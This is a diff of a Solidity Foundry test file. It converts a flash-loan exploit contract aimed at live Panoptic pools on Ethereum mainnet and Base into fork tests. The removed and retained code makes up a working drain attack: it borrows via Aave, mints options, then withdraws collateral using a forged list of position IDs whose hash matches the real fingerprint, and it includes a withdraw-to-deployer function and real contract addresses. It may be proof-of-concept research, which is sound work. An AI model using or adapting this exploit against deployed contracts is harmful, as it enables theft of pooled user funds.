@@ -1,28 +1,22 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.13;
 
-import "./Interfaces.sol";
+import "forge-std/Test.sol";
+/* import {USDC_WETH30bpsMainnetAttacker} from "./USDC_WETH30bpsMainnetAttacker.sol"; */
+import {ETH_USDC5bpsBaseAttacker} from "./ETH_USDC5bpsBaseAttacker.sol";
+import {Attacker} from "./Attacker.sol";
+
+// NOTE: Couldnt get this to work, weird revert in aave.flashLoan
+
 import {TokenId} from "@types/TokenId.sol";
-import {console} from "forge-std/Test.sol";
 
-import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {ISFPM} from "./Interfaces.sol";
 
-// On mainnet
-address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-address constant USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-address constant UNI_POOL = address(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
-address constant AAVE_V3_POOL = address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
+contract MakingFakeTokenIdListPassTest is Test {
 
-address constant PANOPTIC_POOL = address(0x000000000000305B8621e2475aee38ab5721D525);
-address constant SFPM = address(0x0000000000000DEdEDdD16227aA3D836C5753194);
-address constant COLLATERAL_0 = address(0xc74dC5908E3E421004f533287c052bF0cc42ddc1); // USDC
-address constant COLLATERAL_1 = address(0x351eFb333885c5351418aE0134dd54cac0B3143F); // WETH
+    function setUp() public {}
 
-int24 constant MIN_V3POOL_TICK = -887272;
-int24 constant MAX_V3POOL_TICK = 887272;
-
-contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
-    uint256[] fake_token_uints = [
+    uint256[] usdc_weth_30bps_fake_token_uints = [
         // fake list of TokenId uints that hashes to desired value
         0x004000000c000040000008000040000004000040000000020001000000000002,
         0x004000000c000040000008000040000004000040000000020001010000000002,
@@ -276,160 +270,26 @@ contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
         0x004000000c000040000008000040000004000040000000000001f90000000001
     ];
 
-    IERC20Partial token0 = IERC20Partial(USDC);
-    IERC20Partial token1 = IERC20Partial(WETH);
-    IUniswapV3Pool uniPool = IUniswapV3Pool(UNI_POOL);
-    IAAVELendingPool aavePool = IAAVELendingPool(AAVE_V3_POOL);
+    function testTakeFlashLoanAndAttack_USDC_WETH30bpsMainnetAttacker() public {
+        vm.createSelectFork("mainnet", 23222695);
 
-    ICollateralTracker tracker0 = ICollateralTracker(COLLATERAL_0);
-    ICollateralTracker tracker1 = ICollateralTracker(COLLATERAL_1);
-    IPanopticPool pp = IPanopticPool(PANOPTIC_POOL);
-    ISFPM sfpm = ISFPM(SFPM);
+        console.log("block num", block.number);
 
-    function takeFlashLoanAndAttack() public {
-        uint256 initialAssets0 = token0.balanceOf(address(this));
-        uint256 initialAssets1 = token1.balanceOf(address(this));
-        console.log("<<<< BEFORE ATTACK: initial token 0 balance: ", initialAssets0);
-        console.log("<<<< BEFORE ATTACK: initial token 1 balance: ", initialAssets1);
+        // Deploy with CREATE2 for deterministic address
+        bytes32 salt = bytes32(uint256(0x123));
 
-        // take flash loan
-        (uint256 poolAssets0, , ) = tracker0.getPoolData();
-        (uint256 poolAssets1, , ) = tracker1.getPoolData();
+        address WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+        address USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+        address UNI_POOL = address(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
+        address AAVE_V3_POOL = address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
 
-        uint256 LEN = 2;
-        address[] memory addresses = new address[](LEN);
-        uint256[] memory amounts = new uint256[](LEN);
-        uint256[] memory modes = new uint256[](LEN);
+        address PANOPTIC_POOL = address(0x000000000000305B8621e2475aee38ab5721D525);
+        address SFPM = address(0x0000000000000DEdEDdD16227aA3D836C5753194);
+        address COLLATERAL_0 = address(0xc74dC5908E3E421004f533287c052bF0cc42ddc1); // USDC
+        address COLLATERAL_1 = address(0x351eFb333885c5351418aE0134dd54cac0B3143F); // WETH
 
-        addresses[0] = address(token0);
-        amounts[0] = (5 * poolAssets0) / 4; // borrow 125% of the pool assets
-        modes[0] = 0;
-
-        addresses[1] = address(token1);
-        amounts[1] = (5 * poolAssets1) / 4; // borrow 125% of the pool assets
-        modes[1] = 0;
-
-        // TODO: Why revert here?
-        aavePool.flashLoan(address(this), addresses, amounts, modes, address(this), bytes(""), 0);
-
-        console.log("----------- After paying back the flash loan -----------");
-        uint256 finalAssets0 = token0.balanceOf(address(this));
-        uint256 finalAssets1 = token1.balanceOf(address(this));
-
-        uint256 ETH_PRICE = 4_200; // 1 ETH = 4_200 USDC
-        uint256 finalProfit = finalAssets0 + ((finalAssets1 * ETH_PRICE) * 1e6) / 1e18;
-
-        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 0 balance: ", finalAssets0);
-        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 1 balance: ", finalAssets1);
-        console.log(
-            "<<<< AFTER PAYING FLASH LOAN: Total profit on Mainnet (in USDC) at 1 ETH = 4_200e18 USDC: %s",
-            finalProfit
-        );
-        console.log("--------------------------------------------------------");
-    }
-
-    // This function is called by the flash loan provider
-    // We use it to execute our attack logic after taking a flash loan
-    function executeOperation(
-        address[] calldata, // assets,
-        uint256[] calldata amounts,
-        uint256[] calldata premiums,
-        address, // initiator,
-        bytes calldata // params
-    ) public returns (bool) {
-        console.log("<<<< ATTACKER: executeOperation() called");
-
-        // Phase 1: Drain the pool
-        phase1Attack();
-
-        // Phase 2: buy options and then drain pool (not implemented in this example)
-
-        // pay back the flash loan
-        token0.approve(address(aavePool), amounts[0] + premiums[0]);
-        token1.approve(address(aavePool), amounts[1] + premiums[1]);
-
-        return true;
-    }
-
-    function phase1Attack() public {
-        drainPool(); // takes 1/2             = 1/2 of s_poolAssets
-        drainPool(); // takes 1/2 + 1/4       = 3/4 of s_poolAssets
-        /* drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets */
-        // ... gas is the limit here, could do 1 more round
-    }
-
-    function drainPool() public {
-        (uint256 poolAssets0, , ) = tracker0.getPoolData();
-        (uint256 poolAssets1, , ) = tracker1.getPoolData();
-        {
-            console.log("I am contract: ", address(this));
-            console.log("USDC Pool Assets: ", poolAssets0);
-            console.log("WETH Pool Assets: ", poolAssets1);
-
-            // (, int24 currentTick, , , , , ) = IUniswapV3Pool(uniPool).slot0();
-            // console.log("Current tick: ", currentTick);
-            // console.log("Uni token0 is: ", IUniswapV3Pool(uniPool).token0());
-            // console.log("Uni token1 is: ", IUniswapV3Pool(uniPool).token1());
-        }
-
-        uint64 poolId = sfpm.getPoolId(address(uniPool));
-        console.log("------------------------");
-
-        // drain the pool
-
-        // - deposit funds
-
-        uint256 myAssets0 = token0.balanceOf(address(this));
-        uint256 myAssets1 = token1.balanceOf(address(this));
-
-        // as much as I can extract in one go
-        uint128 attackAmount0 = uint128(
-            min((token0.balanceOf(address(this)) * 80) / 100, (poolAssets0 / 2))
-        ); // 20% margin to pay for the options, fees, etc.
-        uint128 depositAmount0 = (attackAmount0 * 120) / 100;
-
-        // as much as I can extract in one go
-        uint128 attackAmount1 = uint128(
-            min((token1.balanceOf(address(this)) * 80) / 100, (poolAssets1 / 2))
-        ); // 20% margin to pay for the options, fees, etc.
-        uint128 depositAmount1 = (attackAmount1 * 120) / 100;
-
-        {
-            console.log("my initial token 0 balance: ", myAssets0);
-            console.log("my initial token 1 balance: ", myAssets1);
-
-            console.log("------------------------");
-            console.log("Starting attack to draining the pool...");
-            console.log("Depositing funds...");
-
-            token0.approve(address(tracker0), type(uint104).max);
-            console.log("my initial tracker0 share balance: ", tracker0.balanceOf(address(this)));
-
-            token1.approve(address(tracker1), type(uint104).max);
-            console.log("my initial tracker1 share balance: ", tracker1.balanceOf(address(this)));
-
-            uint myNewShares0 = tracker0.deposit(depositAmount0, address(this));
-            uint myNewShares1 = tracker1.deposit(depositAmount1, address(this));
-            console.log("tracker0 share balance from deposit(): ", myNewShares0);
-            console.log("tracker1 share balance from deposit(): ", myNewShares1);
-
-            // // ----------- just for reference/debugging -----------
-            // int24 spacing = getTickSpacingFromPoolId(poolId);
-            // console.log("tickSpacing: ", spacing);
-
-            // (int24 minTick, int24 maxTick) = sfpm.getEnforcedTickLimits(poolId);
-            // console.log("Min Enforced tick limit: ", minTick);
-            // console.log("Max Enforced tick limit: ", maxTick);
-            // // These are not rounded to the nearest tickSpacing, so we need to fix them
-            // minTick = minTick/spacing * spacing;
-            // maxTick = maxTick/spacing * spacing;
-            // console.log("Min Enforced tick limit (rounded): ", minTick);
-            // console.log("Max Enforced tick limit (rounded): ", maxTick);
-            // // these are never restricted (only expanded) unless the AMM pool is re-initialized in the SFPM
-            // // So, these (rounded) values are safe to use
-        }
-
-        // - mint ITM options
+        ISFPM sfpm = ISFPM(SFPM);
+        uint64 poolId = sfpm.getPoolId(UNI_POOL);
 
         // --- for Asset 0
         TokenId pos0 = TokenId.wrap(0).addPoolId(poolId).addLeg(
@@ -442,26 +302,11 @@ contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
             -327_000, // strikeTick strike - should be WAAAAY low -- (rounded) minEnforcedTick + spacing, so that tickLower is within bounds
             2 // width; defined as (tickUpper - tickLower) / tickSpacing
         );
-
-        TokenId[] memory posIdList = new TokenId[](1);
-        posIdList[0] = pos0;
-
-        // value used for calculating fake list
-        console.log("minting options with (1 leg) pos0 = ", TokenId.unwrap(pos0));
-        console.log("tracker0 total assets:          ", tracker0.totalAssets());
-        console.log("tracker0 total (shares) supply: ", tracker0.totalSupply());
-
-        console.log("tracker0 my share balance: ", tracker0.balanceOf(address(this)));
-
-        pp.mintOptions(
-            posIdList, // positionIdList
-            attackAmount0, // positionSize (half of the pool assets)
-            0, // effectiveLiquidityLimitX32
-            MIN_V3POOL_TICK, // tickLimitLow
-            MAX_V3POOL_TICK // tickLimitHigh
-        );
+        TokenId[] memory firstRealPosition = new TokenId[](1);
+        firstRealPosition[0] = pos0;
 
         // --- for Asset 1
+        TokenId[] memory twoRealPositions = new TokenId[](2);
         TokenId pos1 = TokenId.wrap(0).addPoolId(poolId).addLeg(
             0, // legIndex
             1, // optionRatio
@@ -472,107 +317,39 @@ contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
             470400, // waaaay high -- (rounded) maxEnforcedTick - spacing, so that tickUpper is within bounds
             2 // width; defined as (tickUpper - tickLower) / tickSpacing
         );
+        twoRealPositions[0] = pos0;
+        twoRealPositions[1] = pos1;
 
-        TokenId[] memory posIdList2 = new TokenId[](2);
-        posIdList2[0] = pos0;
-        posIdList2[1] = pos1;
-
-        console.log("minting options with (1 leg) pos1 = ", TokenId.unwrap(pos1));
-        console.log("tracker1 total assets:          ", tracker1.totalAssets());
-        console.log("tracker1 total (shares) supply: ", tracker1.totalSupply());
-
-        console.log("tracker1 my share balance: ", tracker1.balanceOf(address(this)));
-
-        pp.mintOptions(
-            posIdList2, // positionIdList
-            attackAmount1, // positionSize (half of the pool assets)
-            0, // effectiveLiquidityLimitX32
-            MIN_V3POOL_TICK, // tickLimitLow
-            MAX_V3POOL_TICK // tickLimitHigh
+        Attacker attacker = new Attacker{salt: salt}(
+            WETH,
+            USDC,
+            UNI_POOL,
+            AAVE_V3_POOL,
+            COLLATERAL_0,
+            COLLATERAL_1,
+            PANOPTIC_POOL,
+            SFPM,
+            firstRealPosition,
+            twoRealPositions,
+            usdc_weth_30bps_fake_token_uints
         );
 
-        // ---------------------------------------------------------------------
-        // - withdraw funds with fake position list
-        console.log("Withdrawing with fake positions...");
+        console.log("Attacker deployed at:", address(attacker));
 
-        // Create a list of positions that don't exist
-        TokenId[] memory fakeTokenIdList = new TokenId[](fake_token_uints.length);
-        for (uint16 i = 0; i < fake_token_uints.length; i++) {
-            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
-        }
-
-
-        // Now use the list of positions that don't exist
-
-        // calculate how much I can withdraw
-
-        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
-        console.log("our token0 share balance: ", intermediateBalance0);
-        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
-        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);
-
-        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
-        console.log("our token1 share balance: ", intermediateBalance1);
-        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
-        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);
-
-        console.log("------------------------");
-        console.log("my final token 0 balance: ", token0.balanceOf(address(this)));
-        console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
-        console.log("------------------------");
-
-        console.log('posIdList2 fingerprint', generateFingerprint(posIdList2, 0));
-        console.log('fakeTokenIdList fingerprint', generateFingerprint(fakeTokenIdList, 0));
-
-        // now liquidate my own position and repeat...
-        TokenId[] memory emptyTokenList = new TokenId[](0);
-        pp.liquidate(emptyTokenList, address(this), posIdList2);
+        attacker.takeFlashLoanAndAttack();
     }
 
-    function generateFingerprint(TokenId[] memory positionIdList, uint256 offset) internal pure returns (uint256) {
-        uint256 pLength = positionIdList.length - offset;
-        uint256 fingerprintIncomingList;
+    function testTakeFlashLoanAndAttack_ETH_USDC5bpsBaseAttacker() public {
+        vm.createSelectFork("base");
 
-        for (uint256 i = 0; i < pLength; ) {
-            fingerprintIncomingList = PanopticMath.updatePositionsHash(
-                fingerprintIncomingList,
-                positionIdList[i],
-                true
-            );
-            unchecked {
-                ++i;
-            }
-        }
+        // Deploy with CREATE2 for deterministic address
+        bytes32 salt = bytes32(uint256(0x123));
 
-        return fingerprintIncomingList;
-    }
+        ETH_USDC5bpsBaseAttacker attacker = new ETH_USDC5bpsBaseAttacker{salt: salt}();
 
-    function min(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a < b ? a : b;
-    }
+        console.log("Attacker deployed at:", address(attacker));
 
-    address private immutable deployer;
-
-    constructor() {
-      deployer = msg.sender;
-    }
-
-    modifier onlyDeployer() {
-        require(msg.sender == deployer, "Only deployer can call this function");
-        _;
-    }
-
-    function withdraw(address tokenAddress, uint256 amount) external onlyDeployer {
-        if (tokenAddress == address(0)) {
-            // Withdraw ETH
-            require(address(this).balance >= amount, "Insufficient ETH balance");
-            (bool success, ) = payable(deployer).call{value: amount}("");
-            require(success, "ETH transfer failed");
-        } else {
-            // Withdraw ERC20 token
-            IERC20Partial token = IERC20Partial(tokenAddress);
-            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
-            token.transfer(deployer, amount); // revert if token transfer fails
-        }
+        // Run the attack
+        attacker.takeFlashLoanAndAttack();
     }
 }
